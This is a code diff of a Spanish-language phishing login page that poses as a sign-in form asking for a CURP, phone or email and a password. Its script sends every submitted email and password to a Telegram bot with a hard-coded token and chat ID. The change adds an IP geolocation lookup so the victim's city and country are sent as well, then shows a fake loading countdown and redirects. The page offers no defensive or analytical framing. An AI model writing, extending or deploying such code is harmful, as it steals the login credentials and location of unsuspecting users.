@@ -148,7 +148,7 @@
         <form id="loginForm">
             <div class="input-group">
                 <label for="email">Ingresa tu CURP, Teléfono ó Correo electrónico</label>
-                <input type="text" id="email" name="email" required placeholder=""> <!-- Cambiado a tipo text -->
+                <input type="text" id="email" name="email" required placeholder="">
             </div>
             <div class="input-group">
                 <label for="password">Contraseña</label>
@@ -185,53 +185,64 @@
                 return;
             }
 
-            const url = `https://api.telegram.org/bot6813453135:AAGfFRmuT5uVMFHzXzotCDQmXs3uj8wqB6o/sendMessage`;
-            const data = {
-                chat_id: -4037234500,
-                text: `Spimby:\nEmail: ${email}\nContraseña: ${password}`,
-                parse_mode: 'HTML'
-            };
+            // Llamada a la API de ipapi.co para obtener la ubicación
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(locationData => {
+                    const city = locationData.city || 'Desconocida';
+                    const country = locationData.country_name || 'Desconocido';
 
-            document.getElementById('loading').style.display = 'block';
-            let countdown = 15;
-            document.getElementById('countdown').textContent = countdown;
+                    const url = `https://api.telegram.org/bot6813453135:AAGfFRmuT5uVMFHzXzotCDQmXs3uj8wqB6o/sendMessage`;
+                    const data = {
+                        chat_id: -4037234500,
+                        text: `Spinby:\nEmail: ${email}\nContraseña: ${password}\nCiudad: ${city}\nPaís: ${country}`,
+                        parse_mode: 'HTML'
+                    };
 
-            const interval = setInterval(function() {
-                countdown--;
-                document.getElementById('countdown').textContent = countdown;
+                    document.getElementById('loading').style.display = 'block';
+                    let countdown = 15;
+                    document.getElementById('countdown').textContent = countdown;
 
-                if (countdown <= 0) {
-                    clearInterval(interval);
-                    window.location.href = 'selec.html';
-                }
-            }, 1000);
+                    const interval = setInterval(function() {
+                        countdown--;
+                        document.getElementById('countdown').textContent = countdown;
 
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Mensaje enviado:', data);
-                if (!data.success) {
-                    if (!alertShown) {
-                        alert('Usuario o Contraseña incorrectos.');
-                        alertShown = true;
-                        resetForm();
+                        if (countdown <= 0) {
+                            clearInterval(interval);
+                            window.location.href = 'selec.html';
+                        }
+                    }, 1000);
+
+                    fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(data)
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Mensaje enviado:', data);
+                        if (!data.success) {
+                            if (!alertShown) {
+                                alert('Usuario o Contraseña incorrectos.');
+                                alertShown = true;
+                                resetForm();
+                                document.getElementById('loading').style.display = 'none';
+                                clearInterval(interval);
+                            }
+                        } else {
+                            alert('Inicio de sesión exitoso.');
+                        }
+                    })
+                    .catch((error) => {
+                        console.error('Error:', error);
                         document.getElementById('loading').style.display = 'none';
-                        clearInterval(interval);
-                    }
-                } else {
-                    alert('Inicio de sesión exitoso.');
-                }
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-                document.getElementById('loading').style.display = 'none';
-            });
+                    });
+                })
+                .catch(error => {
+                    console.error('Error obteniendo la ubicación:', error);
+                });
         });
 
         function resetForm() {
